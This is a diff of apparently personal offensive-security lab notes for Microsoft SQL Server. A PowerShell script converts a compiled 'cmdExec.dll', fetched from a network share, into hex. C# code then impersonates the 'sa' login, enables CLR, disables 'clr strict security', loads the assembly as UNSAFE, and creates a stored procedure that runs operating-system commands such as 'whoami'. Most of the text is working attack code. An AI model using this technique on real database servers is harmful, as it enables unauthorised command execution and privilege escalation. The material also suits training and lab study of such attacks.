@@ -28,9 +28,20 @@ public class StoredProcedures
 
     }
 }
-
+# Convert this dll to hexadecimal and put directly into query using below powershell script:
 # Copy this assembly to C:\Tools folder of dc01
 
+$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
+$stringBuilder = New-Object -Type System.Text.StringBuilder 
+
+$fileStream = [IO.File]::OpenRead($assemblyFile)
+while (($byte = $fileStream.ReadByte()) -gt -1) {
+    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
+}
+$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
+
+Now update teh create assembly statement in below code ( String creatAsm = "CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;";) 
+and replace FROM with hexadecimal string created above
 ------------------------------------------------------------------------------------------------------
 using System;
 using System.Data.SqlClient;
@@ -48,7 +59,7 @@ namespace TestSqlConnect
 
             String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
             String enable_options = @"use msdb;EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'clr enabled',1;RECONFIGURE;EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
-            String creatAsm = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\ClassLibrary1.dll' WITH PERMISSION_SET = UNSAFE;";
+            String creatAsm = "CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;";
             String creatPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
             String exeCmd = "Exec cmdExec 'whoami'";
 
